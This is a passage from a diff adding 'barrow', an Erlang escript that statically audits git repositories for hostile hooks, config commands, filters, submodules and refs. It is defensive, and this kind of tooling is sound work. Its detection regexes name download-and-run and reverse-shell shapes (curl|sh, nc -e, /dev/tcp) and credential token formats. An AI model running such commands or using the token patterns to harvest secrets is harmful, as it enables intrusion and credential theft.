@@ -1,0 +1,1466 @@
+#!/usr/bin/env escript
+%% barrow — the barrow holds what the dead were buried with.
+%% offline autopsy of git repositories: the .git directory as attack surface.
+%% one file. zero dependencies beyond a stock erlang install.
+%% nothing executes, nothing leaves the machine.
+
+-mode(compile).
+
+%% ------------------------------------------------------------------ state
+
+new_state(Opts) ->
+    #{findings => [], benign => 0, inputs => [], opts => Opts}.
+
+add_finding(S, Id, Sev, Where, Why, Evidence) ->
+    F = {Id, Sev, sanitize(Where), sanitize(Why), sanitize(Evidence)},
+    S#{findings := [F | maps:get(findings, S)]}.
+
+add_benign(S) -> S#{benign := maps:get(benign, S) + 1}.
+
+add_input(S, Path, Kind, Note) ->
+    S#{inputs := [{Path, Kind, Note} | maps:get(inputs, S)]}.
+
+sev_rank(low) -> 1;
+sev_rank(med) -> 2;
+sev_rank(high) -> 3;
+sev_rank(crit) -> 4.
+
+score(S) ->
+    lists:max([0 | [sev_rank(Sev) || {_, Sev, _, _, _} <- maps:get(findings, S)]]).
+
+verdict_band(0) -> clean;
+verdict_band(1) -> watch;
+verdict_band(2) -> suspicious;
+verdict_band(_) -> hostile.
+
+band_exit(clean) -> 0;
+band_exit(watch) -> 1;
+band_exit(suspicious) -> 3;
+band_exit(hostile) -> 10.
+
+minv_rank(low) -> 1;
+minv_rank(med) -> 2;
+minv_rank(high) -> 3;
+minv_rank(crit) -> 4;
+minv_rank(_) -> 1.
+
+sanitize(B) when is_binary(B) ->
+    T = binary:replace(B, <<"\t">>, <<" ">>, [global]),
+    T2 = binary:replace(T, <<"\n">>, <<" ">>, [global]),
+    T3 = binary:replace(T2, <<"\r">>, <<" ">>, [global]),
+    clip(T3, 160);
+sanitize(L) when is_list(L) -> sanitize(unicode:characters_to_binary(L)).
+
+clip(B, N) when byte_size(B) =< N -> B;
+clip(B, N) -> <<C:N/binary, _/binary>> = B, <<C/binary, "...">>.
+
+%% ------------------------------------------------------------------ color
+
+color_enabled() ->
+    NoColor = os:getenv("NO_COLOR") =/= false,
+    Term = case os:getenv("TERM") of false -> "dumb"; T -> T end,
+    maps:get(color, get_opts()) andalso not NoColor andalso Term =/= "dumb".
+
+get_opts() -> get(barrow_opts).
+put_opts(O) -> put(barrow_opts, O).
+
+paint(Code, S) ->
+    case color_enabled() of
+        true -> io_lib:format("\e[~wm~s\e[0m", [Code, S]);
+        false -> S
+    end.
+
+dim(S) -> paint("2", S).
+red(S) -> paint("1;31", S).
+amber(S) -> paint("33", S).
+green(S) -> paint("32", S).
+bold(S) -> paint("1", S).
+cyan(S) -> paint("36", S).
+
+%% ------------------------------------------------------------------ args
+
+parse_args(Args) ->
+    parse_args(Args, #{cmd => help, pos => [], json => false, quiet => false,
+                       color => true, minv => low, max_blob => 524288}).
+
+parse_args([], O) -> O;
+parse_args(["--json" | R], O) -> parse_args(R, O#{json => true, color => false});
+parse_args(["--no-color" | R], O) -> parse_args(R, O#{color => false});
+parse_args(["--quiet" | R], O) -> parse_args(R, O#{quiet => true, color => false});
+parse_args(["--min-severity", V | R], O) ->
+    parse_args(R, O#{minv => list_to_atom(V)});
+parse_args(["--max-blob", V | R], O) ->
+    parse_args(R, O#{max_blob => list_to_integer(V)});
+parse_args(["-h" | R], O) -> parse_args(R, O#{cmd => help});
+parse_args(["--help" | R], O) -> parse_args(R, O#{cmd => help});
+parse_args([H | R], O) ->
+    case maps:get(cmd, O) of
+        help when H =/= "help" -> parse_args(R, O#{cmd => list_to_atom(H)});
+        _ -> parse_args(R, O#{pos := maps:get(pos, O) ++ [H]})
+    end.
+
+usage() ->
+    <<"barrow - offline autopsy of git repositories. the barrow holds what the dead were buried with.\n"
+      "\n"
+      "usage:\n"
+      "  barrow scan <path>...     autopsy .git dirs and repository work trees\n"
+      "  barrow tree <path>        inventory the tracked files from loose objects\n"
+      "  barrow hooks <path>       print every hook the repo ships\n"
+      "  barrow forge <dir>        generate clean/dirty example repositories\n"
+      "  barrow selftest           run the built-in test battery\n"
+      "  barrow rules              list the checks\n"
+      "  barrow version\n"
+      "\n"
+      "flags:\n"
+      "  --json                    machine output\n"
+      "  --no-color                plain text (NO_COLOR honored)\n"
+      "  --quiet                   findings only\n"
+      "  --min-severity <sev>      low|med|high|crit\n"
+      "  --max-blob <bytes>        content-scan cap (default 524288)\n"
+      "\n"
+      "exit codes: 0 clean, 1 watch, 3 suspicious, 10 hostile, 2 error.\n"
+      "nothing is executed, nothing leaves the machine.">>.
+%% ------------------------------------------------------------------ verbs
+
+verbs(B) ->
+    High = [<<"curl[^|\\n]*\\|\\s*(ba)?sh">>, <<"wget[^|\\n]*\\|\\s*(ba)?sh">>,
+            <<"base64\\s+-d">>, <<"iex\\b|invoke-expression">>,
+            <<"nc\\s+-e">>, <<"/dev/tcp/">>, <<"python[23]?\\s+-c">>,
+            <<"powershell[^\\n]*(-enc|-w\\s+hidden)">>, <<"\\$\\(curl">>,
+            <<"eval\\s*\\(\\)">>, <<"bash\\s+-c">>, <<"sh\\s+-c\\s+\\$">>],
+    Med = [<<"http://[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+">>, <<"openssl\\s+passwd">>,
+           <<"/tmp/">>, <<"dev/shm">>],
+    case first_match(High, B) of
+        {ok, _} -> {crit, <<"shell-download shape">>};
+        nomatch ->
+            case first_match(Med, B) of
+                {ok, _} -> {high, <<"staging path or raw ip">>};
+                nomatch -> benign
+            end
+    end.
+
+first_match([], _) -> nomatch;
+first_match([RX | R], B) ->
+    case re:run(B, RX, [{capture, none}]) of
+        match -> {ok, RX};
+        _ -> first_match(R, B)
+    end.
+
+%% secret patterns: {Name, Regex}
+secret_patterns() ->
+    [{<<"aws key">>, <<"AKIA[0-9A-Z]{16}">>},
+     {<<"github token">>, <<"ghp_[A-Za-z0-9]{36}">>},
+     {<<"github fine-grained pat">>, <<"github_pat_[A-Za-z0-9_]{60,}">>},
+     {<<"slack token">>, <<"xox[abprs]-[0-9A-Za-z-]{10,}">>},
+     {<<"private key block">>, <<"-----BEGIN (RSA |OPENSSH |EC |DSA |PGP )?PRIVATE KEY">>},
+     {<<"google api key">>, <<"AIza[0-9A-Za-z_-]{35}">>},
+     {<<"anthropic key">>, <<"sk-ant-[A-Za-z0-9-]{20,}">>},
+     {<<"gitlab pat">>, <<"glpat-[0-9A-Za-z_-]{20}">>},
+     {<<"npm token">>, <<"npm_[0-9A-Za-z]{36}">>},
+     {<<"stripe key">>, <<"sk_live_[0-9A-Za-z]{24}">>}].
+
+suspicious_names() ->
+    [{<<".env">>, high}, {<<"id_rsa">>, crit}, {<<"id_ed25519">>, crit},
+     {<<".npmrc">>, med}, {<<".netrc">>, high}, {<<"authorized_keys">>, high},
+     {<<"web.config">>, low}, {<<".aws/credentials">>, crit}].
+
+%% ------------------------------------------------------------------ file helpers
+
+read_bin(Path) ->
+    case file:read_file(Path) of
+        {ok, B} -> {ok, B};
+        {error, _} -> error
+    end.
+
+is_exec(Path) ->
+    case file:read_file_info(Path) of
+        {ok, FI} -> (element(2, FI) band 8#00111) =/= 0;
+        _ -> false
+    end.
+
+safe_listdir(Path) ->
+    case file:list_dir(Path) of
+        {ok, L} -> lists:sort([unicode:characters_to_binary(N) || N <- L]);
+        _ -> []
+    end.
+
+file_exists(Path) ->
+    case file:read_file_info(Path) of
+        {ok, _} -> true;
+        _ -> false
+    end.
+
+%% locate the git dir from a work tree or a gitdir path
+locate(<<"">>) -> error;
+locate(P0) ->
+    P = strip_trailing_slash(P0),
+    GitDot = filename:join(P, <<".git">>),
+    case file_exists(GitDot) of
+        true ->
+            case filelib:is_dir(GitDot) of
+                true -> {ok, GitDot, P};
+                false ->
+                    case read_bin(GitDot) of
+                        {ok, <<"gitdir:", Rest/binary>>} ->
+                            Target = strip_ws(Rest),
+                            T2 = case filename:pathtype(Target) of
+                                     relative -> filename:join(P, Target);
+                                     _ -> Target
+                                 end,
+                            case filelib:is_dir(T2) of
+                                true -> {ok, T2, P};
+                                false -> error
+                            end;
+                        _ -> error
+                    end
+            end;
+        false ->
+            case filelib:is_dir(P) andalso file_exists(filename:join(P, <<"HEAD">>)) of
+                true -> {ok, P, bare};
+                false -> error
+            end
+    end.
+
+strip_trailing_slash(B) when byte_size(B) > 1 ->
+    case binary:last(B) of
+        $/ -> binary:part(B, 0, byte_size(B) - 1);
+        _ -> B
+    end;
+strip_trailing_slash(B) -> B.
+
+strip_ws(B) ->
+    drop_trailing(drop_leading(B)).
+
+drop_leading(<<C, R/binary>>) when C =:= $\s; C =:= $\t; C =:= $\n; C =:= $\r ->
+    drop_leading(R);
+drop_leading(B) -> B.
+
+drop_trailing(B) ->
+    case byte_size(B) of
+        0 -> B;
+        N ->
+            case binary:last(B) of
+                C when C =:= $\s; C =:= $\t; C =:= $\n; C =:= $\r ->
+                    drop_trailing(binary:part(B, 0, N - 1));
+                _ -> B
+            end
+    end.
+
+%% ------------------------------------------------------------------ ini reader
+
+read_config(Path) ->
+    case read_bin(Path) of
+        {ok, Raw} -> {ok, parse_ini(join_continuations(Raw))};
+        error -> error
+    end.
+
+join_continuations(Raw) ->
+    Lines = binary:split(Raw, <<"\n">>, [global]),
+    join_cont(Lines, <<>>).
+
+join_cont([], Acc) -> Acc;
+join_cont([L | R], Acc) ->
+    L2 = strip_cr(L),
+    Joined = case byte_size(L2) > 0 andalso binary:last(L2) =:= $\\ of
+                 true -> binary:part(L2, 0, byte_size(L2) - 1);
+                 false -> L2
+             end,
+    case {Joined =/= L2, R} of
+        {true, [_ | _]} -> join_cont(R, <<Acc/binary, Joined/binary, " ">>);
+        {true, []} -> <<Acc/binary, Joined/binary>>;
+        _ -> join_cont(R, <<Acc/binary, Joined/binary, "\n">>)
+    end.
+
+strip_cr(B) ->
+    binary:replace(B, <<"\r">>, <<>>, [global]).
+
+%% parse_ini -> [{Section, Key, Value}] with binaries
+parse_ini(Raw) ->
+    Lines = [L || L <- binary:split(Raw, <<"\n">>, [global]), byte_size(strip_ws(L)) > 0],
+    parse_ini(Lines, none, []).
+
+parse_ini([], _, Acc) -> lists:reverse(Acc);
+parse_ini([L | R], Section, Acc) ->
+    T = strip_ws(L),
+    case T of
+        <<"#", _/binary>> -> parse_ini(R, Section, Acc);
+        <<";", _/binary>> -> parse_ini(R, Section, Acc);
+        <<"[", Rest/binary>> ->
+            case binary:split(Rest, <<"]">>) of
+                [Name, _] -> parse_ini(R, strip_section_quotes(strip_ws(Name)), Acc);
+                _ -> parse_ini(R, Section, Acc)
+            end;
+        _ ->
+            case binary:split(T, <<"=">>) of
+                [K, V] ->
+                    Entry = {Section, strip_ws(K), unquote(strip_ws(V))},
+                    parse_ini(R, Section, [Entry | Acc]);
+                _ -> parse_ini(R, Section, Acc)
+            end
+    end.
+
+%% `merge "pwn"` -> `merge pwn` so lookups can build section names directly
+strip_section_quotes(Name) ->
+    case binary:split(Name, <<"\"">>) of
+        [Before, Rest] ->
+            case binary:split(Rest, <<"\"">>) of
+                [Q, _] -> <<Before/binary, Q/binary>>;
+                _ -> Name
+            end;
+        _ -> Name
+    end.
+
+unquote(B) when byte_size(B) >= 2 ->
+    case {binary:first(B), binary:last(B)} of
+        {$", $"} -> binary:part(B, 1, byte_size(B) - 2);
+        _ -> B
+    end;
+unquote(B) -> B.
+
+cfg_get(Entries, Section, Key) ->
+    SL = unicode:characters_to_binary(Section),
+    KL = lower(unicode:characters_to_binary(Key)),
+    [V || {S, K, V} <- Entries,
+          S =/= none, lower(S) =:= SL, lower(K) =:= KL].
+
+lower(B) -> << <<if C >= $A, C =< $Z -> C + 32; true -> C end>> || <<C>> <= B >>.
+
+%% ------------------------------------------------------------------ verdict engine
+
+report_findings(S) ->
+    lists:reverse(maps:get(findings, S)).
+
+%% scan one input path; returns updated state
+scan_path(Path, S) ->
+    put(barrow_secret_seen, []),
+    put(barrow_stats, #{}),
+    case locate(Path) of
+        {ok, GitDir, WT} ->
+            S1 = add_input(S, Path, git, <<>>),
+            scan_gitdir(GitDir, WT, S1);
+        error ->
+            S1 = add_finding(S, <<"G99">>, med,
+                             unicode:characters_to_binary(Path),
+                             <<"not a git repository or .git directory">>,
+                             <<"nothing to dissect here">>),
+            add_input(S1, Path, missing, <<>>)
+    end.
+%% ------------------------------------------------------------------ scan core
+
+autorun_hooks() ->
+    [<<"post-checkout">>, <<"post-merge">>, <<"post-rewrite">>,
+     <<"post-index-change">>, <<"reference-transaction">>, <<"pre-auto-gc">>].
+
+known_helpers() ->
+    [<<"cache">>, <<"store">>, <<"manager">>, <<"manager-core">>,
+     <<"osxkeychain">>, <<"wincred">>, <<"libsecret">>, <<"wincredman">>].
+
+scan_gitdir(GitDir, WT, S) ->
+    Cfg = case read_config(filename:join(GitDir, <<"config">>)) of
+              {ok, E} -> E;
+              error -> []
+          end,
+    S0 = check_config(GitDir, Cfg, S),
+    S1 = check_hooks(GitDir, Cfg, S0),
+    S2 = check_attributes(GitDir, WT, Cfg, S1),
+    S3 = check_modules(WT, S2),
+    S4 = check_refs(GitDir, S3),
+    S5 = check_objects(GitDir, S4),
+    check_misc(GitDir, S5).
+
+%% ------------------------------------------------------------------ config
+
+check_config(GitDir, Cfg, S) ->
+    Base = <<"config: ", GitDir/binary, "/config">>,
+    S0 = case cfg_get(Cfg, <<"core">>, <<"fsmonitor">>) of
+             [] -> S;
+             [Vf | _] ->
+                 T = lower(Vf),
+                 case T of
+                     <<"true">> -> add_benign(S);
+                     <<"false">> -> add_benign(S);
+                     <<>> -> add_benign(S);
+                     <<"query">> -> add_benign(S);
+                     _ ->
+                         Sev = case verbs(Vf) of
+                                   {crit, _Tag} -> crit;
+                                   {high, _Tag} -> crit;
+                                   benign -> high
+                               end,
+                         Why = case Sev of
+                                   crit -> <<"fsmonitor runs a command: shell-download shape">>;
+                                   _ -> <<"fsmonitor points at a command that runs on filesystem events">>
+                               end,
+                         add_finding(S, <<"G08">>, Sev, Base, Why, Vf)
+                 end
+         end,
+    S1 = case cfg_get(Cfg, <<"core">>, <<"pager">>) of
+             [] -> S0;
+             [Vp | _] ->
+                 case re:run(Vp, <<"[|;`]">>, [{capture, none}]) of
+                     match -> add_finding(S0, <<"G09">>, med, Base,
+                                          <<"pager pipes into the shell">>, Vp);
+                     _ -> add_benign(S0)
+                 end
+         end,
+    S2 = case cfg_get(Cfg, <<"credential">>, <<"helper">>) of
+             [] -> S1;
+             [Vc | _] ->
+                 Known = lists:any(fun(K) -> K =:= lower(Vc) end, known_helpers()),
+                 Cond1 = binary:first(Vc) =:= $!, 
+                 Cond2 = re:run(Vc, <<"[/\\\\]|\\.sh$">>, [{capture, none}]) =/= nomatch,
+                 if
+                     Known -> add_benign(S1);
+                     Cond1 -> add_finding(S1, <<"G10">>, high, Base,
+                                          <<"credential helper is a shell snippet">>, Vc);
+                     Cond2 -> add_finding(S1, <<"G10">>, high, Base,
+                                          <<"credential helper points at a script">>, Vc);
+                     true -> add_finding(S1, <<"G10">>, med, Base,
+                                         <<"unknown credential helper">>, Vc)
+                 end
+         end,
+    S3 = check_aliases(Base, Cfg, S2),
+    S4 = check_remotes(Base, Cfg, S3),
+    S5 = case cfg_get(Cfg, <<"core">>, <<"sshCommand">>) of
+             [] -> S4;
+             [Vs | _] ->
+                 case re:run(lower(Vs), <<"-o[^ ]*=|proxycommand">>, [{capture, none}]) of
+                     match -> add_finding(S4, <<"G13">>, med, Base,
+                                          <<"sshCommand carries ssh options">>, Vs);
+                     _ -> add_benign(S4)
+                 end
+         end,
+    S6 = check_includes(Base, Cfg, S5),
+    case cfg_get(Cfg, <<"safe">>, <<"directory">>) of
+        [<<"*">>] -> add_finding(S6, <<"G15">>, low, Base,
+                                 <<"safe.directory accepts every repository">>, <<"*">>);
+        _ -> S6
+    end.
+
+check_aliases(Base, Cfg, S) ->
+    Aliases = [{K, V} || {Sect, K, V} <- Cfg, lower(Sect) =:= <<"alias">>],
+    case Aliases of
+        [] -> S;
+        _ ->
+            Bad = [{K, V} || {K, V} <- Aliases, binary:first(V) =:= $!],
+            case Bad of
+                [] -> lists:foldl(fun(_, Acc) -> add_benign(Acc) end, S, Aliases);
+                _ ->
+                    lists:foldl(fun({K, V}, Acc) ->
+                                        case verbs(binary:part(V, 1, byte_size(V) - 1)) of
+                                            {crit, Tag} ->
+                                                add_finding(Acc, <<"G11">>, crit, Base,
+                                                            <<"alias ", K/binary, ": ", Tag/binary>>, V);
+                                            {high, Tag} ->
+                                                add_finding(Acc, <<"G11">>, high, Base,
+                                                            <<"alias ", K/binary, ": ", Tag/binary>>, V);
+                                            benign ->
+                                                add_finding(Acc, <<"G11">>, med, Base,
+                                                            <<"alias runs a shell snippet">>, V)
+                                        end
+                                end, S, Bad)
+            end
+    end.
+
+check_remotes(Base, Cfg, S) ->
+    Urls = [{Sect, V} || {Sect, K, V} <- Cfg, lower(K) =:= <<"url">>],
+    lists:foldl(fun({Sect, V}, Acc) ->
+                        Sec = unicode:characters_to_binary(Sect),
+                        Creds = re:run(V, <<"[a-z0-9_]+:[^@/]+@">>, [{capture, none}]) =/= nomatch,
+                        Proxy = re:run(lower(V), <<"proxycommand">>, [{capture, none}]) =/= nomatch,
+                        IsHttp = binary:match(V, <<"http://">>) =/= nomatch,
+                        if
+                            Proxy ->
+                                add_finding(Acc, <<"G12">>, crit, Base,
+                                            <<"remote ", Sec/binary, " tunnels through a command">>, V);
+                            Creds ->
+                                add_finding(Acc, <<"G12">>, high, Base,
+                                            <<"remote ", Sec/binary, " embeds credentials">>, V);
+                            IsHttp ->
+                                add_finding(Acc, <<"G12">>, low, Base,
+                                            <<"remote ", Sec/binary, " over plain http">>, V);
+                            true -> add_benign(Acc)
+                        end
+                end, S, Urls).
+
+check_includes(Base, Cfg, S) ->
+    Paths = [{Sect, V} || {Sect, K, V} <- Cfg,
+                          lower(K) =:= <<"path">>,
+                          binary:match(lower(Sect), <<"include">>) =/= nomatch],
+    lists:foldl(fun({Sect, V}, Acc) ->
+                        Sec = unicode:characters_to_binary(Sect),
+                        case binary:first(V) of
+                            $~ -> add_benign(Acc);
+                            _ -> add_finding(Acc, <<"G14">>, med, Base,
+                                             <<"config pulls in an external file: ", Sec/binary>>, V)
+                        end
+                end, S, Paths).
+
+%% ------------------------------------------------------------------ hooks
+
+check_hooks(GitDir, Cfg, S) ->
+    case cfg_get(Cfg, <<"core">>, <<"hooksPath">>) of
+        [] -> scan_hook_dir(filename:join(GitDir, <<"hooks">>), S);
+        [HP | _] ->
+            P = case filename:pathtype(HP) of
+                    relative -> filename:join(GitDir, HP);
+                    _ -> HP
+                end,
+            Sev = case file_exists(P) of
+                      true -> med;
+                      false -> low
+                  end,
+            S1 = add_finding(S, <<"G03">>, Sev, <<"config: hooksPath">>,
+                             <<"hook directory redirected">>, HP),
+            scan_hook_dir(P, S1)
+    end.
+
+scan_hook_dir(Dir, S) ->
+    case filelib:is_dir(Dir) of
+        false -> S;
+        true ->
+            Files = safe_listdir(Dir),
+            lists:foldl(fun(Name, Acc) ->
+                                Full = filename:join(Dir, Name),
+                                case filelib:is_regular(Full) of
+                                    false -> Acc;
+                                    true -> scan_hook_file(Full, Name, Acc)
+                                end
+                        end, S, Files)
+    end.
+
+scan_hook_file(Full, Name, S) ->
+    Base = <<"hooks: ", Full/binary>>,
+    case binary:matches(Name, <<".sample">>) of
+        [_ | _] -> add_benign(S);
+        [] ->
+            Exec = is_exec(Full),
+            Content = case read_bin(Full) of {ok, B} -> B; error -> <<>> end,
+            case verbs(Content) of
+                {crit, Tag} ->
+                    add_finding(S, <<"G01">>, crit, Base,
+                                <<Name/binary, ": ", Tag/binary>>, clip(Content, 120));
+                {high, Tag} ->
+                    add_finding(S, <<"G01">>, high, Base,
+                                <<Name/binary, ": ", Tag/binary>>, clip(Content, 120));
+                benign ->
+                    Autorun = lists:member(Name, autorun_hooks()),
+                    if
+                        Exec andalso Autorun ->
+                            add_finding(S, <<"G01">>, high, Base,
+                                        <<Name/binary, " runs automatically on clone, pull or checkout">>,
+                                        clip(Content, 80));
+                        Exec ->
+                            add_finding(S, <<"G02">>, low, Base,
+                                        <<Name/binary, " is an executable hook">>, <<>>);
+                        true -> add_benign(S)
+                    end
+            end
+    end.
+
+%% ------------------------------------------------------------------ attributes + modules
+
+check_attributes(GitDir, WT, Cfg, S) ->
+    Dirs = case WT of
+               bare -> [filename:join([GitDir, <<"info">>, <<"attributes">>])];
+               _ -> [filename:join(WT, <<".gitattributes">>),
+                     filename:join([GitDir, <<"info">>, <<"attributes">>])]
+           end,
+    lists:foldl(fun(P, Acc) -> scan_attributes_file(P, Cfg, Acc) end, S, Dirs).
+
+scan_attributes_file(Path, Cfg, S) ->
+    case filelib:is_regular(Path) of
+        false -> S;
+        true ->
+            case read_bin(Path) of
+                {ok, Raw} ->
+                    Lines = [strip_ws(L) || L <- binary:split(Raw, <<"\n">>, [global]),
+                                            byte_size(strip_ws(L)) > 0,
+                                            binary:first(strip_ws(L)) =/= $#],
+                    Base = <<"attributes: ", Path/binary>>,
+                    lists:foldl(fun(Line, Acc) -> scan_attr_line(Line, Base, Cfg, Acc) end, S, Lines);
+                error -> S
+            end
+    end.
+
+scan_attr_line(Line, Base, Cfg, S) ->
+    Tokens = [T || T <- binary:split(Line, <<"\t">>, [global]), T =/= <<>>],
+    Tokens2 = lists:flatmap(fun(T) -> binary:split(T, <<" ">>, [global]) end, Tokens),
+    IsFilter = fun(T) -> binary:match(T, <<"filter=">>) =/= nomatch end,
+    case [T || T <- Tokens2, IsFilter(T)] of
+        [] ->
+            case [T || T <- Tokens2, binary:match(T, <<"merge=">>) =/= nomatch] of
+                [] -> add_benign(S);
+                [M | _] ->
+                    Name = strip_prefix(M, <<"merge=">>),
+                    Drv = cfg_get(Cfg, <<"merge ", Name/binary>>, <<"driver">>),
+                    case Drv of
+                        [] -> add_finding(S, <<"G05">>, low, Base,
+                                          <<"custom merge driver ", Name/binary, " (command not in this config)">>, Line);
+                        [D | _] ->
+                            case verbs(D) of
+                                {crit, Tag} -> add_finding(S, <<"G05">>, crit, Base,
+                                                           <<"merge driver: ", Tag/binary>>, D);
+                                {high, Tag} -> add_finding(S, <<"G05">>, high, Base,
+                                                           <<"merge driver: ", Tag/binary>>, D);
+                                benign -> add_finding(S, <<"G05">>, med, Base,
+                                                      <<"merge driver runs a command on merge">>, D)
+                            end
+                    end
+            end;
+        [F | _] ->
+            Name = strip_prefix(F, <<"filter=">>),
+            Smudge = cfg_get(Cfg, <<"filter ", Name/binary>>, <<"smudge">>),
+            Clean = cfg_get(Cfg, <<"filter ", Name/binary>>, <<"clean">>),
+            Cmd = case Smudge of
+                      [] -> case Clean of
+                                [] -> undefined;
+                                [C | _] -> C
+                            end;
+                      [X | _] -> X
+                  end,
+            IsLfs = lower(Name) =:= <<"lfs">>,
+            LfsOk = IsLfs andalso (binary:match(Cmd, <<"git-lfs">>) =/= nomatch),
+            if
+                Cmd =:= undefined ->
+                    case IsLfs of
+                        true -> add_benign(S);
+                        false ->
+                            add_finding(S, <<"G04">>, med, Base,
+                                        <<"filter ", Name/binary, " declared; its smudge/clean commands live outside this repo">>, Line)
+                    end;
+                LfsOk ->
+                    add_benign(S);
+                true ->
+                    case verbs(Cmd) of
+                        {crit, Tag} ->
+                            add_finding(S, <<"G04">>, crit, Base,
+                                        <<"filter ", Name/binary, " runs at clone time: ", Tag/binary>>, Cmd);
+                        {high, Tag} ->
+                            add_finding(S, <<"G04">>, high, Base,
+                                        <<"filter ", Name/binary, " runs at clone time: ", Tag/binary>>, Cmd);
+                        benign ->
+                            add_finding(S, <<"G04">>, high, Base,
+                                        <<"filter ", Name/binary, " executes a command at checkout (smudge)">>, Cmd)
+                    end
+            end
+    end.
+
+strip_prefix(B, P) ->
+    case binary:split(B, P) of
+        [_, Rest] -> Rest;
+        _ -> B
+    end.
+
+check_modules(WT, S) ->
+    Path = case WT of
+               bare -> none;
+               _ -> filename:join(WT, <<".gitmodules">>)
+           end,
+    case Path of
+        none -> S;
+        P ->
+            case filelib:is_regular(P) of
+                false -> S;
+                true ->
+                    case read_config(P) of
+                        {ok, Entries} ->
+                            Base = <<"modules: ", P/binary>>,
+                            lists:foldl(fun({Sect, K, V}, Acc) ->
+                                                check_module_entry(Sect, K, V, Base, Acc)
+                                        end, S, Entries);
+                        error -> S
+                    end
+            end
+    end.
+
+check_module_entry(Sect, K, V, Base, S) ->
+    case lower(K) of
+        <<"url">> ->
+            Creds = re:run(V, <<"[a-z0-9_]+:[^@/]+@">>, [{capture, none}]) =/= nomatch,
+            IsHttp = binary:match(V, <<"http://">>) =/= nomatch,
+            IsRel = binary:match(V, <<"../">>) =/= nomatch,
+            if
+                Creds ->
+                    add_finding(S, <<"G06">>, high, Base,
+                                <<"submodule ", (strip_prefix(Sect, <<"submodule ">>))/binary, " embeds credentials">>, V);
+                IsHttp ->
+                    add_finding(S, <<"G06">>, med, Base, <<"submodule url over plain http">>, V);
+                IsRel ->
+                    add_finding(S, <<"G06">>, med, Base, <<"submodule points at a relative path">>, V);
+                true -> add_benign(S)
+            end;
+        <<"name">> ->
+            case binary:match(V, <<"..">>) of
+                nomatch -> S;
+                _ -> add_finding(S, <<"G07">>, med, Base, <<"submodule name walks directories">>, V)
+            end;
+        _ -> S
+    end.
+%% ------------------------------------------------------------------ refs
+
+check_refs(GitDir, S) ->
+    Base = <<"refs: ", GitDir/binary>>,
+    S0 = case read_bin(filename:join(GitDir, <<"HEAD">>)) of
+             {ok, <<"ref: ", RefB/binary>>} ->
+                 Ref = strip_ws(RefB),
+                 case binary:match(Ref, <<"..">>) of
+                     nomatch -> add_benign(S);
+                     _ -> add_finding(S, <<"G16">>, high, Base,
+                                      <<"HEAD walks directories">>, Ref)
+                 end;
+             {ok, Sha} ->
+                 add_finding(S, <<"G16">>, low, Base,
+                             <<"detached HEAD">>, strip_ws(Sha));
+             error -> S
+         end,
+    S1 = case read_bin(filename:join(GitDir, <<"packed-refs">>)) of
+             {ok, Raw} ->
+                 Lines = [L || L <- binary:split(Raw, <<"\n">>, [global]),
+                               byte_size(strip_ws(L)) > 0,
+                               binary:first(strip_ws(L)) =/= $#],
+                 lists:foldl(fun(L, Acc) ->
+                                     case binary:split(L, <<" ">>) of
+                                         [_, RefName] ->
+                                             case re:run(strip_ws(RefName), <<"[^\\x20-\\x7e]|\\.\\.">>,
+                                                         [{capture, none}]) of
+                                                 match ->
+                                                     add_finding(Acc, <<"G17">>, med, Base,
+                                                                 <<"odd ref name">>, strip_ws(RefName));
+                                                 _ -> add_benign(Acc)
+                                             end;
+                                         _ -> Acc
+                                     end
+                             end, S0, Lines);
+             error -> S0
+         end,
+    S15 = walk_refs(filename:join(GitDir, <<"refs">>), S1),
+    lists:foldl(fun(Name, Acc) ->
+                        P = filename:join(GitDir, Name),
+                        case read_bin(P) of
+                            {ok, B} when byte_size(B) > 4 ->
+                                add_finding(Acc, <<"G18">>, low, Base,
+                                            <<Name/binary, " carries fetched state">>,
+                                            strip_ws(first_line(B)));
+                            _ -> Acc
+                        end
+                end, S15, [<<"FETCH_HEAD">>, <<"MERGE_HEAD">>, <<"ORIG_HEAD">>]).
+
+walk_refs(Dir, S) ->
+    case filelib:is_dir(Dir) of
+        false -> S;
+        true ->
+            lists:foldl(fun(Name, Acc) ->
+                                Full = filename:join(Dir, Name),
+                                case filelib:is_dir(Full) of
+                                    true -> walk_refs(Full, Acc);
+                                    false ->
+                                        case re:run(Name, <<"\\.\\.">>, [{capture, none}]) of
+                                            match ->
+                                                add_finding(Acc, <<"G17">>, med, <<"refs: ", Dir/binary>>,
+                                                            <<"odd ref name">>, Name);
+                                            _ -> add_benign(Acc)
+                                        end
+                                end
+                        end, S, safe_listdir(Dir))
+    end.
+
+first_line(B) ->
+    case binary:split(B, <<"\n">>) of
+        [L, _] -> L;
+        [L] -> L
+    end.
+
+%% ------------------------------------------------------------------ objects
+
+hex_from_bin(B) ->
+    << << (hex_digit(H)), (hex_digit(L)) >> || <<H:4, L:4>> <= B >>.
+
+hex_digit(N) when N < 10 -> $0 + N;
+hex_digit(N) -> $a + N - 10.
+
+hex_to_bin(Bin) when is_binary(Bin) -> hex_to_bin(Bin, <<>>).
+
+hex_to_bin(<<>>, Acc) -> Acc;
+hex_to_bin(<<C1, C2, R/binary>>, Acc) ->
+    hex_to_bin(R, <<Acc/binary, (hex_val(C1)):4, (hex_val(C2)):4>>).
+
+hex_val(C) when C >= $0, C =< $9 -> C - $0;
+hex_val(C) when C >= $a, C =< $f -> C - $a + 10;
+hex_val(C) when C >= $A, C =< $F -> C - $A + 10.
+
+read_loose(GitDir, ShaHex) ->
+    Path = filename:join([GitDir, <<"objects">>, binary:part(ShaHex, {0, 2}),
+                          binary:part(ShaHex, {2, 38})]),
+    case read_bin(Path) of
+        {ok, Z} ->
+            case catch zlib:unzip(Z) of
+                Raw when is_binary(Raw) ->
+                    case binary:split(Raw, <<0>>) of
+                        [Hdr, Body] ->
+                            case binary:split(Hdr, <<" ">>) of
+                                [TypeB, SizeB] ->
+                                    case catch binary_to_integer(SizeB) of
+                                        Size when is_integer(Size), Size >= 0 ->
+                                            {lower(TypeB), Body, Size};
+                                        _ -> error
+                                    end;
+                                _ -> error
+                            end;
+                        _ -> error
+                    end;
+                _ -> error
+            end;
+        error -> error
+    end.
+
+loose_shas(GitDir) ->
+    ObjDir = filename:join(GitDir, <<"objects">>),
+    Dirs = [D || D <- safe_listdir(ObjDir), byte_size(D) =:= 2,
+                 re:run(D, <<"^[0-9a-f]{2}$">>, [{capture, none}]) =/= nomatch],
+    lists:foldl(fun(D, Acc) ->
+                        Files = [F || F <- safe_listdir(filename:join(ObjDir, D)),
+                                      byte_size(F) =:= 38],
+                        Acc ++ [ <<D/binary, F/binary>> || F <- Files ]
+                end, [], Dirs).
+
